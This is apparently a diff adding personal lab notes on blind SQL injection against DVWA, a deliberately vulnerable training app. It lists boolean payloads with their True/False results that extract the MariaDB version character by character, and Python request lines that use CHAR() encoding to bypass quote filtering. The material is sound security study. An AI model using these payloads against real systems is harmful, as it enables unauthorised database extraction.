@@ -1,0 +1,93 @@
+10.4.17-MariaDB
+
+http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
+
+
+
+1' AND LOCATE(10,@@VERSION); -- -      -> True
+
+1' AND LOCATE(10.,@@VERSION); -- -      -> True
+
+1' AND LOCATE(10.1,@@VERSION); -- -		-> False
+
+1' AND LOCATE(10.4,@@VERSION); -- -      -> True
+
+1' AND LOCATE(10.4,@@VERSION); -- -		->
+
+
+1' AND LOCATE(10.40,@@VERSION);-- -      -> False
+1' AND LOCATE(10.41,@@VERSION);-- -      -> False
+1' AND LOCATE(10.42,@@VERSION);-- -      -> False
+1' AND LOCATE(10.43,@@VERSION);-- -      -> False
+1' AND LOCATE(10.44,@@VERSION);-- -      -> False
+1' AND LOCATE(10.45,@@VERSION);-- -      -> False
+1' AND LOCATE(10.46,@@VERSION);-- -      -> False
+1' AND LOCATE(10.47,@@VERSION);-- -      -> False
+1' AND LOCATE(10.48,@@VERSION);-- -      -> False
+1' AND LOCATE(10.49,@@VERSION);-- -      -> False
+
+
+1' AND LOCATE("10.4.",@@VERSION);-- -      -> True
+
+
+1' AND LOCATE("10.4.0",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.1",@@VERSION);-- -   -> True
+1' AND LOCATE("10.4.2",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.3",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.4",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.5",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.6",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.7",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.8",@@VERSION);-- -   -> False
+1' AND LOCATE("10.4.9",@@VERSION);-- -   -> False
+
+10.4.1
+
+1' AND LOCATE("10.4.10",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.11",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.12",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.13",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.14",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.15",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.16",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.17",@@VERSION);-- -  -> True
+1' AND LOCATE("10.4.18",@@VERSION);-- -  -> False
+1' AND LOCATE("10.4.19",@@VERSION);-- -  -> False
+
+10.4.17
+
+1' AND LOCATE("10.4.17.",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.170",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.171",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.172",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.173",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.174",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.175",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.176",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.177",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.178",@@VERSION);-- -         -> False
+1' AND LOCATE("10.4.179",@@VERSION);-- -         -> False
+
+1' AND @@VERSION="10.4.17-MariaDB";-- -			-> True
+
+1' AND "10.4.17"=@@VERSION;-- -
+
+
+#### Medium
+
+CONCAT(CHAR(75),CHAR(76),CHAR(77))
+
+1 AND LOCATE(CONCAT(CHAR(77)),@@VERSION);-- -   -> True
+
+
+
+",".join(["CHAR("+str(ord(char))+")" for char in "MARIA"])
+
+(VERSION + char)
+
+",".join(["CHAR("+str(ord(el))+")" for el in (VERSION + char) ])
+
+
+response = requests.post(URL, params={'id':"1 AND LOCATE(CONCAT(" + ','.join(['CHAR('+str(ord(el))+')' for el in 'M' ]) + "),@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
+
+response = requests.post(URL, params={'id':"1 AND LOCATE(CONCAT(" + ','.join(["CHAR("+str(ord(el))+")" for el in ('!') ]) + "),@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
